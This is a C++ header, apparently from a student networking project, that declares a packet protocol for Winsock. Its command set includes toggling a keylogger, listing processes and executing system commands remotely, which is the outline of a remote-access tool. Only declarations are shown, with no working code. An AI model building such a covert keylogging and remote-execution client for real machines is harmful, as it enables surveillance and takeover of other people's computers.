#pragma once

#include <cstdint>
#include <cstring>
#include <ctime>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>

struct Message
{
    uint8_t command;         // 1 byte | Contient la commande associée
    uint16_t status_code;    // 1 byte | Contient le code de statut
    uint16_t payload_length; // 2 bytes | Contient la taille du payload
    uint64_t timestamp;      // 8 bytes | Contient le timestamp Unix
    char payload[256];       // 256 bytes | Contient les données envoyées

    Message() {}

    Message(uint8_t cmd, uint8_t status, const std::string &data);

    Message &operator=(const Message &other)
    {
        if (this != &other)
        {
            command = other.command;
            status_code = other.status_code;
            payload_length = other.payload_length;
            timestamp = other.timestamp;
            memcpy(payload, other.payload, sizeof(payload));
        }
        return *this;
    }
};

enum STATUS_CODE
{
    SUCCESS = 0,
    CMD_NOT_FOUND = 1,
    TIMEOUT = 2,
    SERVER_ERR = 3,
    CLIENT_ERR = 4
};

enum CMD
{
    GET_INFO = 0x01,
    TOGGLE_KEYLOG = 0x02,
    GET_PROC_LIST = 0x03,
    EXEC_SYS_CMD = 0x04
};

class LPTF_Packet
{
private:
    Message message;

public:
    // Constructors
    LPTF_Packet();
    LPTF_Packet(const LPTF_Packet &other);
    ~LPTF_Packet();

    // Builders
    // unsigned short getCMD();
    // unsigned short getStatus();
    // unsigned int getPayloadLength(unsigned long &payload);
    unsigned long getTimestamp();
    unsigned long getPayload();

    std::string getClientData();
    void keystate();
    void listProcess();

    LPTF_Packet &
    operator=(const LPTF_Packet &other);

    static std::vector<uint8_t> serializeMessage(const Message &msg);
    static Message deserializeMessage(const std::vector<uint8_t> &buffer);

private:
    // uint64_t ntohll(uint64_t value);
};
